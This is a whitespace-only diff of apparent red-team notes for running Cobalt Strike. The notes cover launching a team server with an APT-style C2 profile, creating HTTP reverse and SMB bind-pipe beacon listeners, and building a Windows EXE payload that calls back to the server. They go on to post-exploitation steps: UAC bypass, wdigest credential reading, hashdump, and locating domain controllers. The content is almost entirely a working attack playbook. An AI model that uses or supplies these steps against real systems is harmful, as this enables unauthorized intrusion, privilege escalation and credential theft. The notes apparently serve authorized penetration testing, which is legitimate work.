@@ -2,28 +2,28 @@ Cobalt Strike
 
 
 Team Server
-	./teamserver <IP> <password> <C2 profile>
-  ./teamserver 10.10.215.21 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile.
+     ./teamserver <IP> <password> <C2 profile>
+     ./teamserver 10.10.215.21 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile.
 
 Attack VM
-	./cobaltstrike
-  Connect
+     ./cobaltstrike
+     Connect
 
 CobaltStrike > Listeners > Add
-	Name: http
-	Payload: windows/beacon_http/reverse_http
-	Host: <IP of Team Server>
-	Port: 80
-	Save
-  Use default IP of the Team Server > Ok > Ok
+     Name: http
+     Payload: windows/beacon_http/reverse_http
+     Host: <IP of Team Server>
+     Port: 80
+     Save
+     Use default IP of the Team Server > Ok > Ok
 
 Attacks > Packages > Windows Executable
-  Listener: http
-  Output: Windows EXE
-  x64: Use x64 payload (if needed)
-  Generate
-  /root/artifact.exe
-  Save > Ok
+     Listener: http
+     Output: Windows EXE
+     x64: Use x64 payload (if needed)
+     Generate
+     /root/artifact.exe
+     Save > Ok
 ------------------------------------------------------------------------------------------------------
 
 cd /root/
@@ -38,25 +38,24 @@ Click artifact.exe to download.
 Double click artifact.exe and you should get the callback.
 
 Right click on the computer in the top pane > Interact
-sleep 0							                Make the beacon interactive.
+sleep 0                                           Make the beacon interactive.
 shell whoami /groups
 
 Cobalt Strike > Listeners > Add
-	Name: smb-pipe
-	Payload: windows/beacon_smb/bind_pipe
-	Host: <IP of Team Server>
-	Port: 9876
-	Save
+     Name: smb-pipe
+     Payload: windows/beacon_smb/bind_pipe
+     Host: <IP of Team Server>
+     Port: 9876
+     Save
 
 Select the Beacon tab
-bypassuac smb-pipe				          You should now be in a high integrity context.
+bypassuac smb-pipe                                You should now be in a high integrity context.
 
 Right click on the new computer in the top pane > Interact
-sleep 0							                Make the beacon interactive.
-ps									                Look at the processes and for interesting tokens.
-wdigest							                See if there are any interesting credentials.
-hashdump						                Dump the hashes.
-shell net group "Domain Computers" /domain	List all computers joined to a domain.
-shell net view /domain			        Find what domain you are on.
-shell nltest /dclist:<domain>		    Locate the domain controller.
-
+sleep 0                                           Make the beacon interactive.
+ps                                                Look at the processes and for interesting tokens.
+wdigest                                           See if there are any interesting credentials.
+hashdump                                          Dump the hashes.
+shell net group "Domain Computers" /domain        List all computers joined to a domain.
+shell net view /domain                            Find what domain you are on.
+shell nltest /dclist:<domain>                     Locate the domain controller.
